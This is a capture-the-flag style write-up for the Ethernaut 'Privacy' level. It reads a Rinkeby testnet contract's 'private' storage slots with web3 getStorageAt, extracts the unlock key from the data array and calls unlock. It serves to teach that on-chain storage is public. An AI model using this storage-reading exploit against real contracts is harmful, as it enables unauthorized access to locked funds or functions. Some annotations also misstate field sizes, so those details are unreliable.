# SOLUTION
## Links
Target: https://rinkeby.etherscan.io/address/0xdad1827FFc71167EfCA746914BA63d6eFfbb7524

Because the contract is not verifyed we don't have the creation code, but...
We can find the storage state values with the web3 api
If we look at the source we have

	bool public locked = true; -> position 0
	uint256 public ID = block.timestamp; -> position 1
	uint8 private flattening = 10; -> 2
	uint8 private denomination = 255; -> 2
	uint16 private awkwardness = uint16(now); -> 2
	bytes32[3] private data; -> 3-5

And we can find the storage layout by compiling the source code in remix
	
	{
    	"storage": [
			{
				"astId": 4,
				"contract": "lvl12.sol:Privacy",
				"label": "locked",
				"offset": 0,
				"slot": "0",
				"type": "t_bool"
			},
			{
				"astId": 8,
				"contract": "lvl12.sol:Privacy",
				"label": "ID",
				"offset": 0,
				"slot": "1",
				"type": "t_uint256"
			},
			{
				"astId": 11,
				"contract": "lvl12.sol:Privacy",
				"label": "flattening",
				"offset": 0,
				"slot": "2",
				"type": "t_uint8"
			},
			{
				"astId": 14,
				"contract": "lvl12.sol:Privacy",
				"label": "denomination",
				"offset": 1,
				"slot": "2",
				"type": "t_uint8"
			},
			{
				"astId": 20,
				"contract": "lvl12.sol:Privacy",
				"label": "awkwardness",
				"offset": 2,
				"slot": "2",
				"type": "t_uint16"
			},
			{
				"astId": 24,
				"contract": "lvl12.sol:Privacy",
				"label": "data",
				"offset": 0,
				"slot": "3",
				"type": "t_array(t_bytes32)3_storage"
			}
		],
		"types": {
			"t_array(t_bytes32)3_storage": {
				"base": "t_bytes32",
				"encoding": "inplace",
				"label": "bytes32[3]",
				"numberOfBytes": "96"
			},
			"t_bool": {
				"encoding": "inplace",
				"label": "bool",
				"numberOfBytes": "1"
			},
			"t_bytes32": {
				"encoding": "inplace",
				"label": "bytes32",
				"numberOfBytes": "32"
			},
			"t_uint16": {
				"encoding": "inplace",
				"label": "uint16",
				"numberOfBytes": "2"
			},
			"t_uint256": {
				"encoding": "inplace",
				"label": "uint256",
				"numberOfBytes": "32"
			},
			"t_uint8": {
				"encoding": "inplace",
				"label": "uint8",
				"numberOfBytes": "1"
			}
		}
	}

https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html

https://ethereum.stackexchange.com/questions/5865/what-does-web3-eth-getstorageat-return

Each contract consists of a EVM bytecode handling the execution and a storage to save the state of the contract. This is a low level function to get the state of the contract's storage. The storage is essentially a key/value store.
The function returns the value the contracts storage has at a certain position.

	await web3.eth.getStorageAt("0xdad1827FFc71167EfCA746914BA63d6eFfbb7524", 0)
	'0x0000000000000000000000000000000000000000000000000000000000000001' -> bool public locked = true; ->  "numberOfBytes": "1"
	await web3.eth.getStorageAt("0xdad1827FFc71167EfCA746914BA63d6eFfbb7524", 1)
	'0x0000000000000000000000000000000000000000000000000000000062d85eab' -> uint256 public ID = block.timestamp; -> "numberOfBytes": "32"
	await web3.eth.getStorageAt("0xdad1827FFc71167EfCA746914BA63d6eFfbb7524", 2)
	'0x000000000000000000000000000000000000000000000000000000005eabff0a' -> uint8 private flattening = 10; (0a) "numberOfBytes": "32" + uint8 private denomination = 255; (ff) "numberOfBytes": "32" + uint16 private awkwardness = uint16(now); (5eab) "numberOfBytes": "2"
	await web3.eth.getStorageAt("0xdad1827FFc71167EfCA746914BA63d6eFfbb7524", 3)
	'0x8470975384c5c22292fc0077aa21feecdd09e066fc06050dcb690bdb11809340'
	await web3.eth.getStorageAt("0xdad1827FFc71167EfCA746914BA63d6eFfbb7524", 4)
	'0x4714d9664c389006492dcb7bc587724cd06dcdddb6951b366f44c79807cbd28a'
	await web3.eth.getStorageAt("0xdad1827FFc71167EfCA746914BA63d6eFfbb7524", 5)
	'0xe1db34113ed449060b644eb16934ac2d24a912b1728fa8d8d89d676b8065d90c'

	bytes32[3] memory _data = ["0x8470975384c5c22292fc0077aa21feecdd09e066fc06050dcb690bdb11809340", "0x4714d9664c389006492dcb7bc587724cd06dcdddb6951b366f44c79807cbd28a", "0xe1db34113ed449060b644eb16934ac2d24a912b1728fa8d8d89d676b8065d90c"]

If we copy the source with this params in the constructor and a function to return bytes16(data[2]) we find 0xe1db34113ed449060b644eb16934ac2d

	await contract.unlock("0xe1db34113ed449060b644eb16934ac2d")
	⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xca7dbf577e04a2e5e2e8e5891100653d1c9301f0049460b2e2951924166e1948

	await contract.locked()
	false


## Level completed!

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": How to read Ethereum contract storage https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925
